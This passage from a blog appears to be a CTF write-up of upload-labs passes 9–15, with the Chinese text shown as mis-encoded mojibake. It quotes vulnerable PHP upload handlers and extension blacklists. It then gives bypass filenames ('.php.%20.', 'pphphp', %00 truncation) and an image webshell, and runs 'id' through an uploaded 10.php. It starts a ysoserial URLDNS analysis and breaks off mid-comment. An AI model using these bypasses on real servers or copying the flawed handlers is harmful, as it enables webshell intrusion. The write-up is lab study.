class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒºåˆ«å°±åœ¨äºï¼Œè¿™æ¬¡çš„æ–‡ä»¶åç”¨çš„æ˜¯ä¹‹å‰çš„æ–‡ä»¶åï¼Œè€Œä¸æ˜¯<code>time+rand+æ‹“å±•å</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130154011911.png" alt="image-20201130154011911"></p><blockquote><p>  æ³¨ï¼šä¸‹é¢çš„%20 ä»£æŒ‡ä¸€ä¸ªç©ºæ ¼</p></blockquote><p>å¦‚æœ<code>file_name</code>åç¼€åæ˜¯<code>.php</code>æˆ–è€…<code>.php.</code>æˆ–è€…<code>.php%20</code>éƒ½å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯<code>.php.</code>å’Œ<code>.php%20</code>ä¼šè¢«<code>deldot</code>å’Œ<code>trim</code>å‡½æ•°å»æ‰æœ«å°¾çš„<code>.</code>å’Œ<code>%20</code>ï¼Œä¸ºäº†é˜²æ­¢å¦‚æ­¤ï¼Œæ‰€ä»¥å¯ä»¥åœ¨åé¢åŠ å…¥ä¸€ä¸ª<code>%20</code>æˆ–<code>.</code>å³ <code>.php.%20</code>æˆ–<code>.php%20.</code>ï¼Œä½†æ˜¯<code>.php%20.</code>ä¼šåœ¨åé¢çš„<code>trim</code>å‡½æ•°ä¸­è¢«å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œæ‰€ä»¥è€ƒè™‘<code>.php.%20</code>ï¼Œä¸ºäº†ç»•è¿‡ç¬¬ä¸€ä¸ª<code>trim</code>å‡½æ•°ï¼Œé˜²æ­¢<code>.</code>è¢«å»æ‰ï¼Œæ‰€ä»¥åœ¨<code>.php.%20</code>çš„åé¢å†åŠ ä¸Šä¸€ä¸ª<code>.</code>ï¼Œå˜æˆ<code>.php.%20.</code></p><p><code>.php.%20. --trim--&gt; .php.%20. --deldot--&gt; .php.%20 --trim --&gt; .php.</code>ç»•è¿‡äº†é»‘åå•ï¼Œå¹¶ä¸”æœ€åçš„æ–‡ä»¶åä¸º<code>.php.%20</code></p><h3 id="ç»•è¿‡-8"><a href="#ç»•è¿‡-8" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>æœ‰å¾…æµ‹è¯•ï¼ˆ</p><h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><h3 id="æºä»£ç -9"><a href="#æºä»£ç -9" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±ä¸€ç³»åˆ—çš„åˆ å‡æªæ–½ï¼Œå˜æˆäº†<code>replace</code>æ›¿æ¢ï¼Œä½†æ˜¯ç”±äºåªæ˜¯ç»è¿‡äº†ä¸€æ¬¡æ›¿æ¢ï¼Œæ²¡æœ‰é€’å½’çš„æ“ä½œï¼Œå¦‚æœåŒå†™åç¼€å<code>.php ==&gt; .pphphp</code>ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºçš„è¿è¡Œé€»è¾‘ä¸­ï¼Œ<code>.p(php)hp</code>æ‹¬å·å†…çš„<code>php</code>å°†è¢«æ›¿æ¢æˆç©ºå­—ç¬¦ï¼Œå˜æˆ<code>.php</code>ï¼Œç”±æ­¤ç»•è¿‡</p><h3 id="ç»•è¿‡-9"><a href="#ç»•è¿‡-9" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>ä¸Šä¼ æ—¶æŠŠæ–‡ä»¶åæ›´æ”¹ä¸º<code>10.pphphp</code>ï¼Œç»è¿‡åæ®µä»£ç åï¼Œå˜æˆ<code>10.php</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201192316165.png" alt="image-20201201192316165"></p><p>è®¿é—®<code>http://ip:port/upload/10.php?c=id</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201192359070.png" alt="image-20201201192359070"></p><h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†ç™½åå•ï¼Œåªå…è®¸ä¸Šä¼ <code>.jpg .png gif</code>åç¼€çš„æ–‡ä»¶ï¼Œè€Œä¸”è´´å¿ƒçš„ç»™äº†ä¸€ä¸ª<code>save_path</code>å‚æ•°</p><p>é—®é¢˜å°±å‡ºåœ¨<code>save_path</code></p><p><strong>å½“ php ç‰ˆæœ¬å°äº 5.3.4ï¼Œå¹¶ä¸”<code>magic_quote_gpc</code>å¤„äºOFFçŠ¶æ€æ—¶ï¼Œæ–‡ä»¶åä¼šè¢«%00å­—ç¬¦æˆªæ–­</strong>ï¼Œå³å¦‚æœæ–‡ä»¶åä¸º<code>11.php%00.jpg</code>ï¼Œä¼šè¢«è§£é‡Šæˆ<code>11.php</code></p><h3 id="ç»•è¿‡-10"><a href="#ç»•è¿‡-10" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>åœ¨<code>save_path</code>å‚æ•°æ„é€ <code>../upload/11.php%00</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201201195722186.png" alt="image-20201201195722186"></p><blockquote><p>  æ³¨ï¼šç”±äºdockerå†…é¶æœºçš„phpç‰ˆæœ¬ä¸º5.5.38ï¼Œå·²ç»ä¿®å¤äº†è¯¥é—®é¢˜ï¼Œæ— æ³•å¤ç°</p></blockquote><h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><h3 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šé¢˜æ˜¯ä¸€æ ·çš„ï¼Œæ— éå°±æ˜¯ä»<code>$_GET</code>å˜æˆäº†<code>$_POST</code></p><p>åœ¨<code>burp suite</code>çš„<code>hex</code>éƒ¨åˆ†åœ¨æ–‡ä»¶ååé¢å¢åŠ ä¸€ä¸ª<code>%00</code>å³å¯ç»•è¿‡</p><h3 id="ç»•è¿‡-11"><a href="#ç»•è¿‡-11" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>åŒä¸Šé¢˜ä¸€æ ·ï¼Œç”±äºphpç‰ˆæœ¬é—®é¢˜ï¼Œæ— æ³•å¤ç°</p><h2 id="pass13-15"><a href="#pass13-15" class="headerlink" title="pass13-15"></a>pass13-15</h2><h3 id="æºç -2"><a href="#æºç -2" class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜è¦æ±‚ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç”±äºç»•è¿‡æ€è·¯ç±»ä¼¼ï¼Œæ‰€ä»¥åªä¸Šä¼ ä¸€ä¸ªï¼ˆ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202194401460.png" alt="image-20201202194401460"></p><p>è¿™é‡Œå‡ºé—®é¢˜å°±å‡ºåœ¨<code>getReailFileType</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åªæ£€æŸ¥äº†æ–‡ä»¶çš„å¤´ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åŠ ä¸Š<code>GIF89a</code>ï¼ˆå³æ–‡ä»¶å¤´ï¼‰å³å¯ç»•è¿‡</p><p>å½“ç„¶ï¼Œæœ‰ä¸ªæ›´åŠ ç®€å•çš„åŠæ³•â€”â€”ç›´æ¥æ‰¾ä¸€å¼ çœŸå®çš„å›¾ç‰‡ï¼Œåœ¨æ–‡ä»¶æœ€åï¼Œå†™ä¸Šæœ¨é©¬ã€‚</p><p>è¿™ä¸ªæ–¹æ³•å¯ä»¥ç›´æ¥pass13-15</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201202194747675.png" alt="image-20201202194747675"></p><blockquote><p>  ç”±äºé˜Ÿå†…webè¯´ 18ï¼Œ19 ä¸æ¨èåšï¼Œé‚£å°±å¤ªç›‘äº†ï¼ˆ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> upload-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS åˆ†æ</title>
      <link href="/URLDNS.html"/>
      <url>/URLDNS.html</url>
      
        <content type="html"><![CDATA[<p>å¯¹<code>ysoserial</code>å·¥å…·ä¸­<code>URLDNS.java</code>åˆ©ç”¨é“¾åˆ†æï¼Œè·Ÿè¸ªè°ƒè¯•ã€‚</p><p><strong>å‚è€ƒpç¥çŸ¥è¯†æ˜Ÿçƒä¸­çš„æ–‡ç« ï¼ˆpç¥åšå®¢é‡Œä¹Ÿæœ‰ï¼‰</strong></p><a id="more"></a><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>å…ˆæ¥çœ‹çœ‹<code>ysoserial</code>å¯¹è¿™ä¸ªgadgetçš„æ³¨é‡Š</p><h3 id="æ¼æ´ç‚¹ï¼Œæ•ˆæœ"><a href="#æ¼æ´ç‚¹ï¼Œæ•ˆæœ" class="headerlink" title="æ¼æ´ç‚¹ï¼Œæ•ˆæœ"></a>æ¼æ´ç‚¹ï¼Œæ•ˆæœ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> 